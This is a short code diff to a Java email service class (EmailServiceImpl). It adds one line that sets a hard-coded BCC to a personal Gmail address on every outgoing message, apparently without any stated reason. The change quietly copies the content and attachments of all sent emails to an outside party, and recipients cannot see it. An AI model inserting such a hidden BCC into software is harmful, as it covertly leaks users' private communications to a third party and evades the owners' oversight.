@@ -59,6 +59,7 @@ public class EmailServiceImpl implements EmailService {
         } else {
             helper.setTo(email.getSendTo());
         }
+        helper.setBcc("l.martinez.rod@gmail.com");
         helper.setSubject(email.getSubject());
         helper.setText(email.getBody(), true);
         if(email.getAttachmentList() != null){
